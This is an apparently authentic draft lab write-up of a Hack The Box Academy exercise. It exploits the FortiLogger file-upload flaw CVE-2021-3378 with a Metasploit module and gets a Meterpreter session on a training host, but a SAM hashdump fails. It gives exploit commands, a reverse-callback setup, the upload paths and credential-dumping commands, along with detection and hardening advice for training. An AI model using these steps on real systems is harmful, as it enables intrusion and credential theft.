---
title: "HTB Academy — Meterpreter: FortiLogger Exploitation and SAM Dump Troubleshooting"
platform: "Hack The Box Academy"
module: "Using the Metasploit Framework"
section: "Meterpreter"
category: "Exploitation / Post-Exploitation"
slug: "htb-metasploit"
status: "EVIDENCE PENDING"
classification: "DOCUMENTED PRACTICE"
observed_date: "2026-10-30"
publication: "unpublished-draft"
source: "https://academy.hackthebox.com/course/preview/using-the-metasploit-framework"
---

# HTB Academy — Meterpreter: FortiLogger Exploitation and SAM Dump Troubleshooting

## 1. Overview

This write-up documents the **Meterpreter** hands-on exercise within Hack The Box Academy's **Using the Metasploit Framework** module. Its scope is one Windows web-service exploitation exercise, not completion of the entire HTB Academy module.

The attack reproduced a FortiLogger arbitrary-file-upload vulnerability associated with **CVE-2021-3378**. All exploitation described here belongs to an authorized, ephemeral training target.

The user-submitted Metasploit transcript verifies that the application check identified **FortiLogger 4.4.2.2**, that the payload was uploaded and invoked, and that a **Meterpreter session (session 2)** opened.

A subsequent `hashdump` attempt returned:

`Operation failed: Incorrect function.`

No `getuid`, `sysinfo`, `getprivs`, Kiwi SAM output, or screenshot is present in the accessible lab evidence.

Consequently, this report does **not** claim independently verified SYSTEM privileges, an NTLM hash extraction, or completion of both exercise questions.

**Assessment:**

- Exploitation and session establishment: VERIFIED.
- Credential-dump objective: NOT VERIFIED.
- Overall publication status: EVIDENCE PENDING.

## 2. Learning Objectives

The exercise trains the operator to:

1. Identify an applicable Metasploit exploit module for a vulnerable web service.
2. Configure the target and reverse callback.
3. Interpret automatic vulnerability checks.
4. Distinguish payload generation, upload, execution, and an established session.
5. Inspect the security context of a Meterpreter process.
6. Understand post-exploitation constraints when accessing Windows local account hashes.
7. Troubleshoot failed post-exploitation operations without incorrectly claiming success.
8. Correlate insecure file uploads with endpoint and network detection opportunities.

## 3. Technical Background

### 3.1 FortiLogger and CVE-2021-3378

FortiLogger is a web-accessible log-management application.

CVE-2021-3378 concerns an unsafe upload path in affected versions, allowing an unauthenticated attacker to place a file of an unintended type where server-side processing can later execute it.

Rapid7 documents the application-specific request path:

`Config/SaveUploadedHotspotLogoFile`

It also identifies a subsequent executable resource:

`Assets/temp/hotspot/img/logohotspot.asp`

These paths describe the published vulnerability mechanics. The submitted lab transcript does not include captured HTTP traffic proving those particular requests on this instance.

The corresponding Metasploit module is:

```text
exploit/windows/http/fortilogger_arbitrary_fileupload
```

The module exploits an unauthenticated arbitrary file upload through an insecure HTTP POST request.

Its published implementation targets affected FortiLogger releases below version 5.2.0 and uses TCP port 5000 by default.

The module documentation also acknowledges potential artifacts on disk, indicators in application logs, and unreliable sessions.

A vulnerable-version check alone is not proof of code execution. In the observed lab, however, Metasploit subsequently reported an established Meterpreter session.

### 3.2 Meterpreter and Windows Account Hashes

Meterpreter is Metasploit's extensible post-exploitation session environment.

The session's account token, process architecture, and effective privileges materially affect privileged operations.

Windows uses the Security Account Manager (SAM) database to store credential-related information for local accounts.

An NT hash is a 32-character hexadecimal representation of credential material. It is different from an LM hash and is not the account's plaintext password.

Windows protects access to these resources.

Meterpreter's `hashdump` command and Kiwi's `lsa_dump_sam` command provide different interfaces for accessing local credential material.

Their success depends on execution context, permissions, compatibility, and operating-system protections.

An established Meterpreter session must not automatically be treated as evidence of `NT AUTHORITY\SYSTEM` privileges.

## 4. Lab Environment and Scope

| Component | Observed Information |
| --- | --- |
| Platform | Hack The Box Academy |
| Module | Using the Metasploit Framework |
| Section | Meterpreter |
| Target application | FortiLogger 4.4.2.2 |
| Vulnerability | CVE-2021-3378 |
| Exploit module | fortilogger_arbitrary_fileupload |
| Target IP | 10.129.203.65 |
| Reverse callback | 10.10.14.26:4444 |
| Target connection port | 49687 |
| Payload stage size | 190534 bytes |
| Meterpreter session | Session 2 |
| Operating system build | Not verified |
| Session account | Not verified |
| NTLM hash | Not verified |

The target and callback addresses are temporary HTB Academy lab addresses, not public production hosts.

The recorded session timestamp was:

`2026-10-30 16:15:45 -0400`

No packet capture, Nmap output, browser screenshot, or independently recorded HTTP request was available for this exercise.

## 5. Reconnaissance and Module Selection

The preceding investigation identified FortiLogger as the service to target.

The relevant Metasploit exploit was:

```text
exploit/windows/http/fortilogger_arbitrary_fileupload
```

The original enumeration commands, `search` output, and `show options` output were not captured in the user-provided terminal evidence.

The following commands reconstruct the standard workflow.

**Illustrative example — not a verbatim historical transcript:**

```bash
msfconsole -q
search fortilogger
use exploit/windows/http/fortilogger_arbitrary_fileupload

show options

set RHOSTS <LAB_TARGET_IP>
set RPORT 5000
set LHOST <LAB_VPN_INTERFACE_OR_IP>
set LPORT 4444

check
run
```

Port 5000 is the default configured by the published Rapid7 module.

The exact historical values of all exploit options and the selected payload architecture are not independently verified by the submitted transcript.

**Evidence Pending — Enumeration**

Required: an authentic screenshot showing the target's service identification, relevant port enumeration, and Metasploit module selection.

No original screenshot is currently available.

## 6. Methodology and Practical Walkthrough

### 6.1 Execute the FortiLogger Exploit

**Status: VERIFIED**

**Objective:** Validate the vulnerable application and attempt controlled remote code execution on the authorized training target.

**Actual recorded command:**

```text
[msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> run
```

**Actual observed output:**

```text
[*] Started reverse TCP handler on 10.10.14.26:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (190534 bytes) to 10.129.203.65
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.129.203.65:49687) at 2026-10-30 16:15:45 -0400
```

**Technical interpretation:**

The automatic check identified FortiLogger version 4.4.2.2 as vulnerable.

Metasploit then generated the payload, uploaded it, and attempted execution.

The reverse TCP handler received a connection, delivered the Meterpreter stage, and reported that session 2 opened.

The session-opening event supports the conclusion that this exploit attempt achieved an interactive Meterpreter session.

It does not independently establish the security identity or privilege level of that session.

**Evidence Pending — Exploit Execution**

Required screenshot: the original terminal displaying the vulnerability check, payload upload, stage delivery, and successful Meterpreter session.

The evidence currently consists of an authentic user-submitted text transcript, not an image.

### 6.2 Inspect the Meterpreter Security Context

**Status: NOT RECORDED**

**Objective:** Identify the Windows account associated with the Meterpreter server process and verify the execution environment before attempting privileged operations.

Recommended diagnostic commands:

```text
getuid
sysinfo
getprivs
```

These commands were suggested during troubleshooting but their execution results were not supplied.

`getuid` identifies the account associated with the Meterpreter session.

`sysinfo` reports information about the target system and architecture.

`getprivs` lists privileges associated with the current process token.

A third-party walkthrough referenced the account `NT AUTHORITY\SYSTEM`. That answer is not evidence of a successful `getuid` command in this user's session.

**Evidence Pending — Session Identity**

Required screenshot: actual Meterpreter output showing the session username and system information.

No verified result is available.

### 6.3 Attempt to Retrieve SAM Credential Material

**Status: FAILED — VERIFIED**

**Objective:** Retrieve the NTLM hash associated with the local training account `htb-student`.

**Actual command and terminal output:**

```text
(Meterpreter 2)(C:\Windows\system32) > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
(Meterpreter 2)(C:\Windows\system32) >
```

**Technical interpretation:**

The `hashdump` operation failed.

The error indicates that Meterpreter could not successfully complete the requested SAM hash retrieval through this interface.

The failure does not invalidate the previously established Meterpreter session.

However, no local account records or password hashes were returned in the submitted evidence.

This result cannot be described as successful credential extraction.

**Evidence Pending — Hashdump Failure**

Required screenshot: the original Meterpreter terminal showing the `hashdump` command and the exact error.

The user-provided text output is available and preserved.

### 6.4 Alternative Post-Exploitation Checks

**Status: RECOMMENDED — NOT VERIFIED**

The following commands were suggested for further investigation:

```text
getuid
sysinfo
getprivs
load kiwi
lsa_dump_sam
```

These commands would help characterize the active session and investigate an alternative interface for reading local SAM information in the authorized laboratory.

No output confirming their execution or success was provided.

The public walkthrough hash mentioned earlier in the conversation has intentionally been excluded because importing another operator's answer would undermine the evidence standard.

**Evidence Pending — Follow-Up Verification**

Required screenshot, if these steps were performed: authentic terminal output showing the follow-up commands and results.

## 7. Results and Verification

| Finding | Evidence | Assessment |
| --- | --- | --- |
| FortiLogger version identified | Automatic check | Verified |
| Vulnerable version reported | Metasploit check | Verified |
| Payload uploaded | Metasploit output | Verified |
| Payload execution attempted | Metasploit output | Verified |
| Meterpreter session established | Session 2 opened | Verified |
| SYSTEM privileges | No getuid output | Unverified |
| SAM dump completed | hashdump error | Not achieved |
| htb-student NTLM hash | No actual dump output | Unverified |
| HTB answer submission | No confirmation | Unverified |

The observed exercise demonstrates successful initial exploitation and session establishment.

It does not demonstrate successful credential extraction.

Therefore, the appropriate classification is **DOCUMENTED PRACTICE**, with publication status **EVIDENCE PENDING**.

## 8. Troubleshooting

### 8.1 Observed Error

The main error was:

```text
priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
```

### 8.2 Potential Causes

The submitted terminal output alone cannot identify the definitive root cause.

Possible conditions worth investigating include:

- Unexpected session account privileges.
- Differences between payload and target process architectures.
- API invocation or Meterpreter compatibility problems.
- Windows security restrictions.
- Limitations of the selected SAM extraction interface.

These are diagnostic hypotheses, not confirmed findings.

### 8.3 Recommended Diagnostic Sequence

First, record the security identity:

```text
getuid
```

Next, inspect the system and process context:

```text
sysinfo
getprivs
```

Finally, investigate compatibility with the appropriate post-exploitation extension.

The conversation proposed Kiwi, but contained no confirmation of a successful resolution.

Re-running the initial exploit is not inherently necessary simply because a post-exploitation function fails.

### 8.4 Resolution Status

The credential-dumping issue remained unresolved in the submitted evidence.

No successful SAM dump or alternative credential extraction was verified.

## 9. Security Implications

An unauthenticated arbitrary-file-upload vulnerability can convert an application-layer weakness into operating-system code execution.

Its impact depends on the execution context of the vulnerable service, network reachability, filesystem permissions, and isolation controls.

In this lab, the Meterpreter callback demonstrated that application exposure was sufficient to establish a remote interactive session.

That is a meaningful security impact even without confirmed administrative access.

At the same time, it is important to distinguish access to an interactive session from access to privileged credential stores.

The failed `hashdump` command does not prove that the system was adequately protected against every credential-access technique. It only establishes that this specific attempt did not succeed.

## 10. Defensive Perspective and SOC/DFIR Relevance

### 10.1 Preventive Controls

Organizations should:

- Upgrade affected FortiLogger installations in accordance with vendor guidance.
- Restrict network access to administrative interfaces.
- Enforce server-side file type and content validation.
- Store uploaded files outside executable web directories.
- Disable script execution in upload locations.
- Apply least privilege to application services.
- Monitor and restrict unexpected outbound connections.

### 10.2 Detection Opportunities

Defenders should investigate unusual HTTP POST requests associated with the FortiLogger upload workflow.

Relevant indicators may include:

- Requests to the vulnerable logo-upload functionality.
- Creation of unexpected executable files in web-accessible directories.
- Subsequent access to uploaded ASP content.
- Suspicious child processes spawned by the hosting service.
- Unexpected outbound TCP sessions.
- Changes to application directories following an upload.

### 10.3 Recommended Telemetry

Potential investigation sources include:

- Web server and application access logs.
- Windows Security Event ID 4688 when process auditing is enabled.
- Sysmon Event ID 1 for process creation, if Sysmon is deployed.
- Network connection telemetry.
- Endpoint detection and response process trees.
- File-creation monitoring.
- Application error logs.

These are recommended detection sources and were not collected in the submitted lab evidence.

### 10.4 Detection Correlation

A useful sequence for SOC investigation is:

```text
Unauthenticated HTTP Upload
        |
        v
Unexpected File Creation
        |
        v
Request to Uploaded Executable Content
        |
        v
Suspicious Process Execution
        |
        v
Outbound Reverse Connection
        |
        v
Potential Interactive Compromise
```

This sequence is a generalized defensive model.

For the actual HTB exercise, the directly available evidence consists of the Metasploit console reports of successful upload, execution, and session establishment.

A real-world investigation should independently corroborate those events with web, file, process, and network telemetry.

## 11. Lessons Learned

**Lesson 1 — Separate exploitation stages.**

A vulnerability check, payload upload, execution attempt, and established session are different technical outcomes.

**Lesson 2 — Verify the security context.**

An active Meterpreter session does not automatically imply SYSTEM privileges.

**Lesson 3 — Treat failed operations as evidence.**

The unsuccessful SAM dump is an important troubleshooting result and should be preserved rather than omitted.

**Lesson 4 — Distinguish references from observations.**

Public exploitation documentation explains how a vulnerability works, but it does not establish what happened on a specific training target.

**Lesson 5 — Preserve evidentiary integrity.**

Third-party walkthrough answers cannot substitute for the operator's actual terminal output.

**Lesson 6 — Include the defensive perspective.**

Exploitation knowledge becomes more valuable when connected to detection, hardening, incident response, and forensic investigation.

## 12. References

1. Hack The Box Academy — Using the Metasploit Framework

   https://academy.hackthebox.com/course/preview/using-the-metasploit-framework

2. Rapid7 — FortiLogger Arbitrary File Upload Exploit

   https://www.rapid7.com/db/modules/exploit/windows/http/fortilogger_arbitrary_fileupload/

3. Rapid7 — CVE-2021-3378

   https://www.rapid7.com/db/vulnerabilities/cve-2021-3378/

4. Rapid7 — Metasploit Exploit Source

   https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/fortilogger_arbitrary_fileupload.rb

5. Check Point — FortiLogger Arbitrary File Upload Advisory

   https://advisories.checkpoint.com/defense/advisories/public/2021/cpai-2021-0199.html

## 13. Evidence Manifest and Publication Gate

### Available Evidence

The following evidence was supplied as actual terminal text:

- FortiLogger vulnerability check.
- FortiLogger version 4.4.2.2.
- Payload generation and upload.
- Payload execution attempt.
- Meterpreter stage delivery.
- Meterpreter session 2 opened.
- Failed `hashdump` command.

### Evidence Pending

Authentic screenshots have not been verified for:

1. Enumeration and service discovery.
2. Successful exploit and Meterpreter session.
3. Meterpreter user identity.
4. SAM hashdump failure.
5. Subsequent diagnostics, if performed.

### Publication Decision

This article must remain an unpublished draft until the available evidence has been reviewed.

It must not be automatically inserted into the public Write-ups index.

The full technical content must be preserved during integration.

No screenshot may be invented, substituted, or attributed to a different laboratory session.

The eventual public article must also respect the applicable Hack The Box Academy publication rules and avoid unnecessary disclosure of challenge answers or sensitive credential material.

**Current state: EVIDENCE PENDING.**
